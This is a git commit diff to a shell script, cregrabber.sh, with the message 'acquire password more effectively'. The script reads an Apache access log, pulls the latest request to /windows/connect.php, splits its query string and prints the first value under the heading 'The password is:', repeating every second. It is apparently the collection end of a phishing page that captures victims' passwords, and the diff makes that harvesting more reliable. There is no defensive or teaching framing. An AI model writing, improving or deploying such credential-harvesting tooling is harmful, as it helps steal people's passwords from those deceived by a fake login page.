a1ea947759b5eaadba4656077aa6c58a8681366f
abhijithb200 <69154038+abhijithb200@users.noreply.github.com>
2021-04-19 08:30:58 +0000

    acquire password more effectively

--- cregrabber.sh
+++ cregrabber.sh
@@ -1,17 +1,25 @@
-
-
-
-
+function getcre(){
 mon="$(sudo tail -1 /var/log/apache2/access.log)"
 
 s="$(grep "GET /windows/connect.php?" /var/log/apache2/access.log | tail -1)"
 f="$(echo $s | cut -d " " -f 7)"
-	QUERY="$(echo $f | cut -d "?" -f2)"
-	IFS="&"
-	set -- $QUERY
-	pass1="$(echo $1 | cut -d "=" -f2)"
-	pass2="$(echo $2 | cut -d "=" -f2)"
-	echo $pass1
-	echo $pass2
-tail -f /var/log/apache2/access.log
 
+        QUERY="$(echo $f | cut -d "?" -f2)"
+        IFS="&"
+        set -- $QUERY
+        pass1="$(echo $1 | cut -d "=" -f2)"
+        pass2="$(echo $2 | cut -d "=" -f2)"
+        printf "\r\t\t\t\t$pass1"
+
+}
+echo " "
+echo " "
+echo "                    The password is:"
+#tail -f /var/log/apache2/access.log
+
+
+
+while true;do
+getcre;
+sleep 1s
+done
